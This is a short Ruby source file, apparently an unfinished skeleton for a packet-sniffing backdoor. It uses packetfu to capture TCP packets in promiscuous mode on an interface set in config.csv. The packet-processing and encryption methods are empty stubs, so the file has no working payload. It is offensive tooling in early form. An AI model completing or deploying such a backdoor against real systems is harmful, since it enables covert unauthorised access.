#! usr/bin/env ruby

require 'csv'
require 'rubygems'
require 'packetfu'

class Backdoor
    @start = false
    
    def initialize(start = false)
        conf_array = CSV.read("config.csv")
        @conf_array = conf_array[0]
        @iface = @conf_array[0]
        @cfg = PacketFu::Utils.whoami?(:iface=>@iface)
        
        if start then
            listen
        end # if
    end # initalize
    
    def listen
        if @start then
            puts "Backdoor already running"
        else # if
            @start = true
        end # else
    
        cap = PacketFu::Capture.new(:iface => @iface, :start => true,
                :promisc => true, :filter => @conf_array[1])
        
        cap.stream.each do |pkt|
            if PacketFu::TCPPacket.can_parse?(pkt) then
                packet = PacketFu::Packet.parse(pkt)
                process_packet(packet)
            end # can_parse? 
        end # cap
    end # listen
    
    def process_packet(packet)
        
    end # process_packet
    
    def encrypt

    end # encrypt
end
